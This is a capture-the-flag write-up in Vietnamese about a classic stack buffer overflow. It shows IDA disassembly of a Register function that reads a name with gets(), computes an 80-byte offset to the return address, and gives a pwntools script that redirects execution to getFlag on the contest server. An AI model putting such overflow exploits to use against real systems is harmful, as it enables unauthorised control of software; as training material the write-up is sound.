Ý tưởng bài này là ghi đè địa chỉ trả về, mục đích là thay đổi luồng chương trình để gọi hàm `getFlag`.

```asm
.text:08048531 ; =============== S U B R O U T I N E =======================================
.text:08048531
.text:08048531 ; Attributes: bp-based frame
.text:08048531
.text:08048531 ; void Register()
.text:08048531                 public Register
.text:08048531 Register        proc near               ; CODE XREF: main+30↓p
.text:08048531
.text:08048531 name            = byte ptr -4Ch
.text:08048531 balance         = dword ptr -0Ch
.text:08048531 var_4           = dword ptr -4
.text:08048531
.text:08048531 ; __unwind {
.text:08048531                 push    ebp
.text:08048532                 mov     ebp, esp
.text:08048534                 push    ebx
.text:08048535                 sub     esp, 54h
.text:08048538                 call    __x86_get_pc_thunk_bx
.text:0804853D                 add     ebx, 1AC3h
.text:08048543                 mov     [ebp+balance], 0
.text:0804854A                 sub     esp, 0Ch
.text:0804854D                 lea     eax, (aPleaseEnterYou - 804A000h)[ebx] ; "[+] Please enter your name: "
.text:08048553                 push    eax             ; format
.text:08048554                 call    _printf
.text:08048559                 add     esp, 10h
.text:0804855C                 sub     esp, 0Ch
.text:0804855F                 lea     eax, [ebp+name]
.text:08048562                 push    eax             ; s
.text:08048563                 call    _gets
.text:08048568                 add     esp, 10h
.text:0804856B                 sub     esp, 8
.text:0804856E                 push    [ebp+balance]
.text:08048571                 lea     eax, (aThanksForTheRe - 804A000h)[ebx] ; "[+] Thanks for the registration, your b"...
.text:08048577                 push    eax             ; format
.text:08048578                 call    _printf
.text:0804857D                 add     esp, 10h
.text:08048580                 nop
.text:08048581                 mov     ebx, [ebp+var_4]
.text:08048584                 leave
.text:08048585                 retn
.text:08048585 ; } // starts at 8048531
.text:08048585 Register        endp
```

Cần nhập `64 + 16 = 80` bytes để tới địa chỉ trả về, tiếp theo là `4` bytes địa chỉ của hàm `getFlag`.

Get flag script:

```python
from pwn import *

r = remote('61.28.237.24', 30204)
print(r.recvuntil('Please enter your name: '))
r.sendline(b'a' * (64 + 16) + p32(0x08048506))
print(r.interactive())
```
